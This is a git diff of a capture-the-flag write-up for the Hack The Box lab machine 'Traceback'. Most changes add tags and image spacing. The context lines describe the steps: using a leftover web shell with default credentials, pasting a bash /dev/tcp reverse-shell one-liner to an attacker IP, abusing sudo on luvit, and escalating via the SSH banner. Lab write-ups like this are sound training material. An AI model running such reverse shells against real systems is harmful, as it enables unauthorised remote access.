@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/traceback.png
-tags: ["HTB"]
+tags: ["HTB", "webshell", "vim", "smevk", "lua", "luvit", "ssh", "motd", "linpeas", "linenum"]
 ---
 
 # Traceback
@@ -39,6 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 32.58 seconds
 - Web server 
 
 ![](./images/1.png)
+
 ![](./images/2.png)
 
 - Since we have a hint that there is a web shell left
@@ -74,18 +75,22 @@ Progress: 847 / 848 (99.88%)
 - Let's try default creds
 
 ![](./images/4.png)
+
 ![](./images/5.png)
 
 - Let's get a reverse shell
   - Enter `bash -c 'bash -i >& /dev/tcp/10.10.16.7/6666 0>&1'` to `Execute` field
 
 ![](./images/6.png)
+
 ![](./images/7.png)
+
 ## User
 - Found a note inside home folder
   - Also have `sudo` rights as sysadmin to execute [luvit](https://luvit.io/)
 
 ![](./images/8.png)
+
 ![](./images/9.png)
 
 - Since we are tracing the path of the attacker
@@ -99,7 +104,9 @@ Progress: 847 / 848 (99.88%)
   - ssh to box as `sysadmin` using the key
 
 ![](./images/10.png)
+
 ![](./images/11.png)
+
 ![](./images/12.png)
 
 ## Root
@@ -108,6 +115,7 @@ Progress: 847 / 848 (99.88%)
   - They are owned by `sysadmin` group
 
 ![](./images/14.png)
+
 ![](./images/15.png)
 
 - We saw that the `ssh` banner was changed
